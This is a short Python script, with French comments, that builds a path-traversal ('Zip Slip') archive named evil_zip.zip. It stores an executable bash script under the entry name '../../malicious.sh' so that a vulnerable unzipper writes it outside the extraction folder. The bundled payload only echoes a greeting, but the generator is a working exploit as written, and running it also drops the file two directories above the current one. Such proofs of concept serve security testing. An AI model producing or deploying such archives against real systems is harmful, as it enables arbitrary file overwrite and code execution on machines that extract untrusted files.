import zipfile
import os

# Créer un répertoire temporaire pour le fichier à zipper
os.makedirs('evil', exist_ok=True)

# Créer un script Bash malveillant
with open('evil/../../malicious.sh', 'w') as f:
    f.write("#!/bin/bash\n")
    f.write('echo \"Salut c est fanta\"')

# Rendre le script exécutable
os.chmod('evil/../../malicious.sh', 0o755)

# Créer le fichier ZIP avec le script piégé
with zipfile.ZipFile('evil_zip.zip', 'w') as zipf:
    zipf.write('evil/../../malicious.sh', arcname='../../malicious.sh')

print("Fichier ZIP piégé créé avec script Bash : evil_zip.zip")